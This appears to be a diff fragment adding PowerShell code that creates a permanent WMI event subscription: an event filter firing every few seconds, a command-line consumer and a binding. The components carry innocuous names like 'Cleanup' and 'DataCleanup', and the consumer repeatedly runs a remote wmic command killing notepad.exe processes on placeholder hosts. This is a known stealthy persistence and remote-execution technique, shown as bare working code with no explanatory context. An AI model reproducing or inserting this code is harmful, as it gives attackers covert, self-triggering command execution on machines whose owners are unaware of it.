@@ -1,0 +1,29 @@
+    $EventFilterName = 'Cleanup'
+    $EventConsumerName = 'DataCleanup'
+    $finalPayload = "wmic /interactive:off /node:<ComputerID,ComputerID,ComputerID> process where name=`"notepad.exe`" delete"
+
+    # Create event filter
+    $EventFilterArgs = @{
+        EventNamespace = 'root/cimv2'
+        Name = $EventFilterName
+        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_OperatingSystem'"
+        QueryLanguage = 'WQL'
+    }
+
+    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
+
+    # Create CommandLineEventConsumer
+    $CommandLineConsumerArgs = @{
+        Name = $EventConsumerName
+        CommandLineTemplate = $finalPayload
+    }
+    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
+
+    # Create FilterToConsumerBinding
+    $FilterToConsumerArgs = @{
+        Filter = $Filter
+        Consumer = $Consumer
+    }
+    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
+
+}
